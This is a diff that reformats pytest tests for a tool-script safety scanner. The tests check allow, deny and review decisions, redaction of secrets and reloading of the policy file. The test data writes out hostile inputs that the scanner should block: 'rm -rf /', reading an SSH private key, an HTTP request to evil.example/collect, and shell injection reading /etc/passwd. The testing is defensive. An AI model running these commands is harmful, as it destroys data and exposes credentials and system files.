@@ -30,8 +30,7 @@ def scanner() -> ToolScriptSafetyScanner:
         ToolSafetyPolicy(
             allowed_domains=["api.example.com"],
             allowed_commands=["echo", "pwd", "ls", "cat", "grep", "curl"],
-        )
-    )
+        ))
 
 
 @pytest.mark.parametrize(
@@ -40,8 +39,7 @@ def scanner() -> ToolScriptSafetyScanner:
         ("safe_python", "python", "items = [1, 2, 3]\nprint(sum(items))", "allow", None),
         ("dangerous_delete", "bash", "rm -rf /", "deny", "FILE_DESTRUCTIVE"),
         ("read_ssh_key", "python", "print(open('~/.ssh/id_rsa').read())", "deny", "PATH_FORBIDDEN"),
-        ("network_egress", "python", "requests.get('https://evil.example/collect')", "deny",
-         "NET_DOMAIN_NOT_ALLOWED"),
+        ("network_egress", "python", "requests.get('https://evil.example/collect')", "deny", "NET_DOMAIN_NOT_ALLOWED"),
         ("allowed_network", "python", "requests.get('https://api.example.com/health')", "allow", None),
         ("subprocess", "python", "subprocess.run(['git', 'status'])", "needs_human_review", "PROCESS_SPAWN"),
         ("shell_injection", "bash", "echo safe; cat /etc/passwd", "deny", "SHELL_CONTROL_OPERATOR"),
@@ -72,16 +70,12 @@ def test_policy_reload_changes_domain_path_and_command(tmp_path):
         encoding="utf-8",
     )
     scanner = ToolScriptSafetyScanner.from_policy_file(policy_file)
-    report = scanner.scan(
-        ToolSafetyRequest(tool_name="x", script="status", language="bash")
-    )
+    report = scanner.scan(ToolSafetyRequest(tool_name="x", script="status", language="bash"))
     assert report.decision == SafetyDecision.ALLOW
-    assert scanner.scan(ToolSafetyRequest(
-        tool_name="x", script="curl https://internal.example/ok", language="python"
-    )).decision == SafetyDecision.ALLOW
-    assert "PATH_FORBIDDEN" in scanner.scan(ToolSafetyRequest(
-        tool_name="x", script="open('/sensitive/key')", language="python"
-    )).rule_ids
+    assert scanner.scan(ToolSafetyRequest(tool_name="x", script="curl https://internal.example/ok",
+                                          language="python")).decision == SafetyDecision.ALLOW
+    assert "PATH_FORBIDDEN" in scanner.scan(
+        ToolSafetyRequest(tool_name="x", script="open('/sensitive/key')", language="python")).rule_ids
 
 
 def test_500_line_scan_is_faster_than_one_second(scanner):
@@ -142,8 +136,7 @@ def test_sensitive_environment_values_are_not_recorded(scanner):
             script="print('done')",
             language="python",
             environment={"API_KEY": "super-secret-value"},
-        )
-    )
+        ))
     serialized = report.model_dump_json()
     assert report.redacted is True
     assert "super-secret-value" not in serialized
